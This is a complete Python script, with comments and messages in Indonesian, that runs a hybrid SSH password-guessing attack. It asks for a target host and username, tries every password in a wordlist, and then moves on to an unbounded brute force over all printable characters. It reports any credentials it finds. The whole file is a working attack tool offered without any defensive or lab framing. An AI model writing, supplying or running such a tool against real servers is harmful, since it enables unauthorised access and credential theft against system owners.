import paramiko
import sys
import time
import itertools
import string

def attempt_login(ssh_client, hostname, port, username, password, timeout):
    """Mencoba satu kali login SSH dan mengembalikan True jika berhasil."""
    try:
        ssh_client.connect(hostname=hostname, port=port, username=username, password=password, timeout=timeout, auth_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"Error SSH: {e}. Menjeda sebentar sebelum mencoba lagi...")
        time.sleep(5) 
        return False
    except paramiko.buffered_pipe.PipeTimeout:
        print(f"Koneksi timeout untuk '{password}'. Server mungkin memblokir atau terlalu lambat.")
        return False
    except Exception as e:
        print(f"Error tidak terduga saat mencoba '{password}': {e}")
        return False
    finally:
        # Pastikan klien SSH ditutup setelah setiap percobaan
        if ssh_client: 
            ssh_client.close()


def run_brute_force_hybrid(hostname, port, username, password_list_file, timeout=5):
    """
    Melakukan serangan brute force hibrida: dictionary attack, lalu pure brute force.
    """
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
    # --- Tahap 1: Dictionary Attack ---
    print("--------------------------------------------------")
    print("  Tahap 1: Memulai Dictionary Attack SSH")
    print("--------------------------------------------------\n")

    try:
        with open(password_list_file, 'r') as f:
            dictionary_passwords = f.readlines()
    except FileNotFoundError:
        print(f"Peringatan: File daftar kata sandi '{password_list_file}' tidak ditemukan. Melewatkan dictionary attack.")
        dictionary_passwords = []
        
    if dictionary_passwords:
        print(f"Mencoba {len(dictionary_passwords)} kata sandi dari {password_list_file}...\n")
        for i, password in enumerate(dictionary_passwords):
            password = password.strip()
            if not password: 
                continue

            print(f"Mencoba (Dictionary): {password}")
            if attempt_login(ssh_client, hostname, port, username, password, timeout):
                print(f"\n[SUKSES] Kredensial ditemukan! Username: {username}, Password: {password}")
                return # Langsung keluar jika berhasil
            
            # Re-initialize SSHClient for the next attempt if it was closed in attempt_login
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 

        print("\n[SELESAI Tahap 1] Tidak ada kata sandi yang cocok ditemukan dalam daftar.")
    else:
        print("Tidak ada kata sandi dalam daftar atau file tidak ditemukan. Langsung ke Pure Brute Force.")

    # --- Tahap 2: Pure Brute Force (Tanpa Batas Panjang & Semua Simbol) ---
    print("\n--------------------------------------------------")
    print("  Tahap 2: Memulai Pure Brute Force SSH")
    print("--------------------------------------------------\n")

    character_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    
    # Menampilkan set karakter untuk konfirmasi
    print(f"Menggunakan karakter set: '{character_set}'")

    current_length = 1 # Selalu dimulai dari panjang 1

    try:
        while True: # Loop tanpa henti sampai ditemukan atau dihentikan manual
            print(f"\n--- Mencoba kata sandi dengan panjang: {current_length} karakter ---")
            
            # Hitung perkiraan jumlah kombinasi untuk panjang saat ini (untuk informasi saja)
            num_combinations = len(character_set) ** current_length
            print(f"   (Sekitar {num_combinations:,} kombinasi untuk panjang ini)")

            for combination in itertools.product(character_set, repeat=current_length):
                password = "".join(combination)
                
                # Inisialisasi ulang SSHClient untuk setiap percobaan di tahap pure brute force
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Coba login
                print(f"Mencoba (Pure Brute Force): {password}")
                if attempt_login(ssh_client, hostname, port, username, password, timeout):
                    print(f"\n[SUKSES] Kredensial ditemukan! Username: {username}, Password: {password}")
                    return # Langsung keluar jika berhasil

            current_length += 1 # Pindah ke panjang kata sandi berikutnya
    except KeyboardInterrupt:
        print("\n[DIHENTIKAN] Brute force dihentikan oleh pengguna (Ctrl+C).")
        return # Keluar jika Ctrl+C
    except Exception as e:
        print(f"Terjadi kesalahan fatal: {e}")
        print("Menghentikan skrip.")
        sys.exit(1)

if __name__ == "__main__":
    print("--------------------------------------------------")
    print("  Skrip Brute Force SSH Hibrida")
    print("--------------------------------------------------\n")

    target_hostname = input("Masukkan hostname atau IP server SSH target: ")
    target_port_str = input("Masukkan port SSH target (default: 22): ") or '22'
    try:
        target_port = int(target_port_str)
    except ValueError:
        print("Port tidak valid. Menggunakan default 22.")
        target_port = 22

    target_username = input("Masukkan username SSH target: ")
    password_file = input("Masukkan path ke file daftar kata sandi (kosongkan jika tidak ingin dictionary attack): ")
    
    print("\nMemulai serangan hibrida...")
    run_brute_force_hybrid(target_hostname, target_port, target_username, password_file)